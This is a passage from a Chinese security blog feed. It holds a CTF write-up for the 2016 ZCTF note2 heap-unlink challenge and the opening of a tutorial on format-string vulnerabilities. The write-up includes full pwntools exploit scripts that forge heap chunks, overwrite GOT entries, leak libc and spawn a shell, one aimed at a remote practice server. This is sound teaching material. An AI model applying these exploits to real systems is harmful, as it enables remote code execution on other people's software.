p.recvuntil(&#39;\nOK\n&#39;, drop&#x3D;True).ljust(8, &#39;\x00&#39;)</span><br><span class="line">    puts_addr &#x3D; u64(puts_addr)</span><br><span class="line">    log.success(&#39;puts addr: &#39; + hex(puts_addr))</span><br><span class="line">    libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]</span><br><span class="line">    binsh_addr &#x3D; libc_base + next(libc.search(&#39;&#x2F;bin&#x2F;sh&#39;))</span><br><span class="line">    system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">    log.success(&#39;libc base: &#39; + hex(libc_base))</span><br><span class="line">    log.success(&#39;&#x2F;bin&#x2F;sh addr: &#39; + hex(binsh_addr))</span><br><span class="line">    log.success(&#39;system addr: &#39; + hex(system_addr))</span><br><span class="line"></span><br><span class="line">    # modify atoi@got to system addr</span><br><span class="line">    payload &#x3D; p64(system_addr)</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line">    p.send(p64(binsh_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210813112557290.png" alt="image-20210813112557290" style="zoom:50%;"><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210813112630353.png" alt="image-20210813112630353"></p><h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2016_zctf_note2">题目链接</a></p><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先，我们先分析一下程序，可以看出程序的主要功能为</p><ul><li>添加 note，size 限制为 0x80，size 会被记录，note 指针会被记录。</li><li>展示 note 内容。</li><li>编辑 note 内容，其中包括覆盖已有的 note，在已有的 note 后面添加内容。</li><li>释放 note。</li></ul><p>仔细分析后，可以发现程序有以下几个问题</p><ol><li>在添加 note 时，程序会记录 note 对应的大小，该大小会用于控制读取 note 的内容，但是读取的循环变量 i 是无符号变量，所以比较时都会转换为无符号变量，那么当我们输入 size 为 0 时，glibc 根据其规定，会分配 0x20 个字节，但是程序读取的内容却并不受到限制，故而会产生堆溢出。</li><li>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。</li></ol><p>第一个问题对应在 ida 中的代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned __int64 __fastcall ReadStr(char *s, __int64 len, char a3)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; &#x2F;&#x2F; [rsp+Ch] [rbp-34h]</span><br><span class="line">  char buf; &#x2F;&#x2F; [rsp+2Fh] [rbp-11h]</span><br><span class="line">  unsigned __int64 i; &#x2F;&#x2F; [rsp+30h] [rbp-10h]</span><br><span class="line">  ssize_t v7; &#x2F;&#x2F; [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; a3;</span><br><span class="line">  for ( i &#x3D; 0LL; len - 1 &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 &#x3D; read(0, &amp;buf, 1uLL);</span><br><span class="line">    if ( v7 &lt;&#x3D; 0 )</span><br><span class="line">      exit(-1);</span><br><span class="line">    if ( buf &#x3D;&#x3D; v4 )</span><br><span class="line">      break;</span><br><span class="line">    s[i] &#x3D; buf;</span><br><span class="line">  &#125;</span><br><span class="line">  s[i] &#x3D; 0;</span><br><span class="line">  return i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 i 是 unsigned 类型，a2 为 int 类型，所以两者在 for 循环相比较的时候，a2-1 的结果 - 1 会被视为 unsigned 类型，此时，即最大的整数。所以说可以读取任意长度的数据，这里也就是后面我们溢出所使用的办法。</p><h3 id="基本思路-1"><a href="#基本思路-1" class="headerlink" title="基本思路"></a>基本思路</h3><p>这里我们主要利用发现的第一个问题，主要利用了 fastbin 的机制、unlink 的机制。</p><p>下面依次进行讲解。</p><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>首先，我们先把 note 可能的基本操作列举出来。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p &#x3D; process(&#39;.&#x2F;note2&#39;)</span><br><span class="line">note2 &#x3D; ELF(&#39;.&#x2F;note2&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def newnote(length, content):</span><br><span class="line">    p.recvuntil(&#39;option---&gt;&gt;&#39;)</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    p.recvuntil(&#39;(less than 128)&#39;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(&#39;content:&#39;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shownote(id):</span><br><span class="line">    p.recvuntil(&#39;option---&gt;&gt;&#39;)</span><br><span class="line">    p.sendline(&#39;2&#39;)</span><br><span class="line">    p.recvuntil(&#39;note:&#39;)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def editnote(id, choice, s):</span><br><span class="line">    p.recvuntil(&#39;option---&gt;&gt;&#39;)</span><br><span class="line">    p.sendline(&#39;3&#39;)</span><br><span class="line">    p.recvuntil(&#39;note:&#39;)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(&#39;2.append]&#39;)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def deletenote(id):</span><br><span class="line">    p.recvuntil(&#39;option---&gt;&gt;&#39;)</span><br><span class="line">    p.sendline(&#39;4&#39;)</span><br><span class="line">    p.recvuntil(&#39;note:&#39;)</span><br><span class="line">    p.sendline(str(id))</span><br></pre></td></tr></table></figure><p>生成三个note</p><p>构造三个 chunk，chunk0、chunk1 和 chunk2</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># chunk0: a fake chunk</span><br><span class="line">ptr &#x3D; 0x0000000000602120</span><br><span class="line">fakefd &#x3D; ptr - 0x18</span><br><span class="line">fakebk &#x3D; ptr - 0x10</span><br><span class="line">content &#x3D; &#39;a&#39; * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + &#39;b&#39; * 64 + p64(0x60)</span><br><span class="line">#content &#x3D; p64(fakefd) + p64(fakebk)</span><br><span class="line">newnote(128, content)</span><br><span class="line"># chunk1: a zero size chunk produce overwrite</span><br><span class="line">newnote(0, &#39;a&#39; * 8)</span><br><span class="line"># chunk2: a chunk to be overwrited and freed</span><br><span class="line">newnote(0x80, &#39;b&#39; * 16)</span><br></pre></td></tr></table></figure><p>其中这三个 chunk 申请时的大小分别为 0x80，0，0x80，chunk1 虽然申请的大小为 0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。同时，由于无符号整数的比较问题，可以为该 note 输入任意长的字符串。</p><p>这里需要注意的是，chunk0 中一共构造了两个 chunk</p><ul><li>chunk ptr[0]，这个是为了 unlink 时修改对应的值。</li><li>chunk ptr[0]’s nextchunk，这个是为了使得 unlink 时的第一个检查满足。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span><br><span class="line">if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))      \</span><br><span class="line">  malloc_printerr (&quot;corrupted size vs. prev_size&quot;);               \</span><br></pre></td></tr></table></figure><p>当构造完三个note后，堆的基本构造如下图1所示。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                                   +-----------------+ high addr</span><br><span class="line">                                   |      ...        |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |      &#39;b&#39;*8      |</span><br><span class="line">                ptr[2]-----------&gt; +-----------------+</span><br><span class="line">                                   |    size&#x3D;0x91    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prevsize     |</span><br><span class="line">                                   +-----------------|------------</span><br><span class="line">                                   |    unused       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;a&#39;*8        |</span><br><span class="line">                 ptr[1]----------&gt; +-----------------+  chunk 1</span><br><span class="line">                                   |    size&#x3D;0x20    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prevsize     |</span><br><span class="line">                                   +-----------------|-------------</span><br><span class="line">                                   |    unused       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |  prev_size&#x3D;0x60 |</span><br><span class="line">fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+</span><br><span class="line">                                   |    64*&#39;a&#39;       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakebk       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakefd       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0x61         |  chunk 0</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;a *8        |</span><br><span class="line">                 ptr[0]----------&gt; +-----------------+</span><br><span class="line">                                   |    size&#x3D;0x91    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prev_size    |</span><br><span class="line">                                   +-----------------+  low addr</span><br><span class="line">                                           图1</span><br></pre></td></tr></table></figure><h4 id="释放-chunk1-覆盖-chunk2-释放-chunk2"><a href="#释放-chunk1-覆盖-chunk2-释放-chunk2" class="headerlink" title="释放 chunk1 - 覆盖 chunk2 - 释放 chunk2"></a>释放 chunk1 - 覆盖 chunk2 - 释放 chunk2</h4><p>对应的代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># edit the chunk1 to overwrite the chunk2</span><br><span class="line">deletenote(1)</span><br><span class="line">content &#x3D; &#39;a&#39; * 16 + p64(0xa0) + p64(0x90)</span><br><span class="line">newnote(0, content)</span><br><span class="line"># delete note 2 to trigger the unlink</span><br><span class="line"># after unlink, ptr[0] &#x3D; ptr - 0x18</span><br><span class="line">deletenote(2)</span><br></pre></td></tr></table></figure><p>首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2，覆盖之后如图 2 所示。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                                   +-----------------+high addr</span><br><span class="line">                                   |      ...        |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |   &#39;\x00&#39;+&#39;b&#39;*7  |</span><br><span class="line">                ptr[2]-----------&gt; +-----------------+ chunk 2</span><br><span class="line">                                   |    size&#x3D;0x90    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0xa0         |</span><br><span class="line">                                   +-----------------|------------</span><br><span class="line">                                   |    &#39;a&#39;*8        |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;a&#39;*8        |</span><br><span class="line">                 ptr[1]----------&gt; +-----------------+ chunk 1</span><br><span class="line">                                   |    size&#x3D;0x20    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prevsize     |</span><br><span class="line">                                   +-----------------|-------------</span><br><span class="line">                                   |    unused       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |  prev_size&#x3D;0x60 |</span><br><span class="line">fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+</span><br><span class="line">                                   |    64*&#39;a&#39;       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakebk       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakefd       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0x61         |  chunk 0</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;a *8        |</span><br><span class="line">                 ptr[0]----------&gt; +-----------------+</span><br><span class="line">                                   |    size&#x3D;0x91    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prev_size    |</span><br><span class="line">                                   +-----------------+  low addr</span><br><span class="line">                                           图2</span><br></pre></td></tr></table></figure><p>该覆盖主要是为了释放 chunk2 的时候可以后向合并（合并低地址），对 chunk0 中虚拟构造的 chunk 进行 unlink。即将要执行的操作为 unlink(ptr[0])，同时我们所构造的 fakebk 和 fakefd 满足如下约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br></pre></td></tr></table></figure><p>unlink 成功执行，会导致 ptr[0] 所存储的地址变为 fakebk，即 ptr-0x18。</p><h4 id="获取-system-地址"><a href="#获取-system-地址" class="headerlink" title="获取 system 地址"></a>获取 system 地址</h4><p>代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># overwrite the chunk0(which is ptr[0]) with got atoi</span><br><span class="line">atoi_got &#x3D; note2.got[&#39;atoi&#39;]</span><br><span class="line">content &#x3D; &#39;a&#39; * 0x18 + p64(atoi_got)</span><br><span class="line">editnote(0, 1, content)</span><br><span class="line"># get the aoti addr</span><br><span class="line">shownote(0)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;is &#39;)</span><br><span class="line">atoi_addr &#x3D; sh.recvuntil(&#39;\n&#39;, drop&#x3D;True)</span><br><span class="line">print atoi_addr</span><br><span class="line">atoi_addr &#x3D; u64(atoi_addr.ljust(8, &#39;\x00&#39;))</span><br><span class="line">print &#39;leak atoi addr: &#39; + hex(atoi_addr)</span><br><span class="line"></span><br><span class="line"># get system addr</span><br><span class="line">atoi_offest &#x3D; libc.symbols[&#39;atoi&#39;]</span><br><span class="line">libcbase &#x3D; atoi_addr - atoi_offest</span><br><span class="line">system_offest &#x3D; libc.symbols[&#39;system&#39;]</span><br><span class="line">system_addr &#x3D; libcbase + system_offest</span><br><span class="line"></span><br><span class="line">print &#39;leak system addr: &#39;, hex(system_addr)</span><br></pre></td></tr></table></figure><p>我们修改 ptr[0] 的内容为 ptr 的地址 - 0x18，所以当我们再次编辑 note0 时，可以覆盖 ptr[0] 的内容。这里我们将其覆盖为 atoi 的地址。 这样的话，如果我们查看 note 0 的内容，其实查看的就是 atoi 的地址。</p><p>之后我们根据 libc 中对应的偏移计算出 system 的地址。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># overwrite the atoi got with systemaddr</span><br><span class="line">content &#x3D; p64(system_addr)</span><br><span class="line">editnote(0, 1, content)</span><br></pre></td></tr></table></figure><p>由于此时 ptr[0] 的地址 got 表的地址，所以我们可以直接修改该 note，覆盖为 system 地址。</p><h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># get shell</span><br><span class="line">sh.recvuntil(&#39;option---&gt;&gt;&#39;)</span><br><span class="line">sh.sendline(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>此时如果我们再调用 atoi ，其实调用的就是 system 函数，所以就可以拿到 shell 了。</p><p>exp</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io &#x3D; remote(&#39;node3.buuoj.cn&#39;,26189)</span><br><span class="line">#io &#x3D; process(&quot;.&#x2F;note2&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;note2&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;.&#x2F;libc-2.23-64.so&quot;)</span><br><span class="line"></span><br><span class="line">#context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def new_note(size, content):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvuntil(&quot;)&quot;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def show_note(index):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit_note(index, choice, content):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.recvuntil(&quot;]&quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete_note(index):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;:&quot;)</span><br><span class="line">io.sendline(&quot;&#x2F;bin&#x2F;sh&quot;) #name</span><br><span class="line">io.recvuntil(&quot;:&quot;)</span><br><span class="line">io.sendline(&quot;ddd&quot;)</span><br><span class="line"></span><br><span class="line">ptr_0 &#x3D; 0x602120</span><br><span class="line">fake_fd &#x3D; ptr_0 - 0x18</span><br><span class="line">fake_bk &#x3D; ptr_0 - 0x10</span><br><span class="line"></span><br><span class="line">note0_content &#x3D; &quot;\x00&quot; * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk)</span><br><span class="line">new_note(0x80, note0_content) #note0</span><br><span class="line">new_note(0x0, &quot;aa&quot;) #note1</span><br><span class="line">new_note(0x80, &quot;&#x2F;bin&#x2F;sh&quot;) #note2</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">delete_note(1)</span><br><span class="line">note1_content &#x3D; &quot;\x00&quot; * 16 + p64(0xa0) + p64(0x90)</span><br><span class="line">new_note(0x0, note1_content)</span><br><span class="line"></span><br><span class="line">delete_note(2) #unlink</span><br><span class="line">#gdb.attach(io)</span><br><span class="line"># 泄漏libc</span><br><span class="line">free_got &#x3D; elf.got[&quot;free&quot;]</span><br><span class="line">payload &#x3D; 0x18 * &quot;a&quot; + p64(free_got)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">edit_note(0, 1, payload)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line">show_note(0)</span><br><span class="line">io.recvuntil(&quot;is &quot;)</span><br><span class="line"></span><br><span class="line">free_addr &#x3D; u64(io.recv(6).ljust(8, &quot;\x00&quot;))</span><br><span class="line">libc_addr &#x3D; free_addr - libc.symbols[&quot;free&quot;]</span><br><span class="line">print(&quot;libc address: &quot; + hex(libc_addr))</span><br><span class="line"></span><br><span class="line">#get shell</span><br><span class="line">system_addr &#x3D; libc_addr + libc.symbols[&quot;system&quot;]</span><br><span class="line">one_gadget &#x3D; libc_addr + 0xf02a4</span><br><span class="line">edit_note(0, 1, p64(one_gadget)) #overwrite free got -&gt; system address</span><br><span class="line">#io.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。&lt;/p&gt;
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="PWN" scheme="http://www.ol4three.com/tags/PWN/"/>
    
      <category term="unlink" scheme="http://www.ol4three.com/tags/unlink/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="http://www.ol4three.com/2021/02/08/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.ol4three.com/2021/02/08/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-02-08T07:16:54.000Z</published>
    <updated>2021-09-22T08:07:23.411Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞原理介绍"><a href="#格式化字符串漏洞原理介绍" class="headerlink" title="格式化字符串漏洞原理介绍"></a>格式化字符串漏洞原理介绍</h1><h2 id="格式化字符串函数介绍"><a href="#格式化字符串函数介绍" class="headerlink" title="格式化字符串函数介绍"></a>格式化字符串函数介绍</h2><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>后续参数，<strong>可选</strong></li></ul><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/printf.png" alt="img"></p><a id="more"></a><h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><p>常见的有格式化字符串函数有</p><ul><li>输入<ul><li>scanf</li></ul></li><li>输出</li></ul><table><thead><tr><th>函数</th><th>基本介绍</th></tr></thead><tbody><tr><td>printf</td><td>输出到 stdout</td></tr><tr><td>fprintf</td><td>输出到指定 FILE 流</td></tr><tr><td>vprintf</td><td>根据参数列表格式化输出到 stdout</td></tr><tr><td>vfprintf</td><td>根据参数列表格式化输出到指定 FILE 流</td></tr><tr><td>sprintf</td><td>输出到字符串</td></tr><tr><td>snprintf</td><td>输出指定字节数到字符串</td></tr><tr><td>vsprintf</td><td>根据参数列表格式化输出到字符串</td></tr><tr><td>vsnprintf</td><td>根据参数列表格式化输出指定字节到字符串</td></tr><tr><td>setproctitle</td><td>设置 argv</td></tr><tr><td>syslog</td><td>输出日志</td></tr><tr><td>err, verr, warn, vwarn 等</td><td>。。。</td></tr></tbody></table><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>这里我们了解一下格式化字符串的格式，其基本格式如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure><p>每一种 pattern 的含义请具体参考维基百科的<a href="https://zh.wikipedia.org/wiki/格式化字符串">格式化字符串</a> 。以下几个 pattern 中的对应选择需要重点关注</p><p> 这里我们了解一下格式化字符串的格式，其基本格式如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure><p>每一种 pattern 的含义请具体参考维基百科的<a href="https://zh.wikipedia.org/wiki/格式化字符串">格式化字符串</a> 。以下几个 pattern 中的对应选择需要重点关注</p><ul><li>parameter<ul><li>n$，获取格式化字符串中的指定参数</li></ul></li><li>flag</li><li>field width<ul><li>输出的最小宽度</li></ul></li><li>precision<ul><li>输出的最大长度</li></ul></li><li>length，输出的长度<ul><li>hh，输出一个字节</li><li>h，输出一个双字节</li></ul></li><li>type<ul><li>d/i，有符号整数</li><li>u，无符号整数</li><li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li><li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li><li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li><li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li><li>%， ‘<code>%</code>‘字面值，不接受任何 flags, width。</li></ul></li></ul><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>就是相应的要输出的变量。</p><h2 id="格式化字符串原理"><a href="#格式化字符串原理" class="headerlink" title="格式化字符串原理"></a>格式化字符串原理</h2><p>在一开始，我们就给出格式化字符串的基本介绍，这里再说一些比较细致的内容。我们上面说，格式化字符串函数是根据格式化字符串函数来进行解析的。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制</strong>。比如说’%s’表明我们会输出一个字符串参数。</p><p>我们再继续以上面的为例子进行介绍</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/printf-20210303175725164.png" alt="基本例子"></p><p>对于这样的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">some value</span><br><span class="line">3.14</span><br><span class="line">123456</span><br><span class="line">addr of &quot;red&quot;</span><br><span class="line">addr of format string: Color %s...</span><br></pre></td></tr></table></figure><p><strong>注：这里我们假设 3.14 上面的值为某个未知的值。</strong></p><p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p><ul><li>当前字符不是 %，直接输出到相应标准输出。</li><li>当前字符是 %， 继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是 %, 输出 %</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>那么假设，此时我们在编写程序时候，写成了下面的样子</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf(&quot;Color %s, Number %d, Float %4.2f&quot;);</span><br></pre></td></tr></table></figure><p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p><ol><li>解析其地址对应的字符串</li><li>解析其内容对应的整形值</li><li>解析其内容对应的浮点值</li></ol><p>对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。</p><p>这基本就是格式化字符串漏洞的基本原理了。</p><h2 id="参考阅读"><a href="#参考阅读" class="headerlink" title="参考阅读"></a>参考阅读</h2><ul><li><a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2</a></li></ul><h1 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h1><p>其实，在上一部分，我们展示了格式化字符串漏洞的两个利用手段</p><ul><li>使程序崩溃，因为 %s 对应的参数地址不合法的概率比较大。</li><li>查看进程内容，根据 %d，%f 输出了栈上的内容。</li></ul><p>下面我们会对于每一方面进行更加详细的解释。</p><h2 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h2><p>通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们只需要输入若干个 %s 即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%s%s%s%s%s%s%s%s%s%s%s%s%s%s</span><br></pre></td></tr></table></figure><p>这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。</p><h2 id="泄漏内存"><a href="#泄漏内存" class="headerlink" title="泄漏内存"></a>泄漏内存</h2><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址</li><li>盲打，dump 整个程序，获取有用信息。</li></ul></li></ul><p>泄漏栈内存</p><p>例如，给定如下程序</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main() 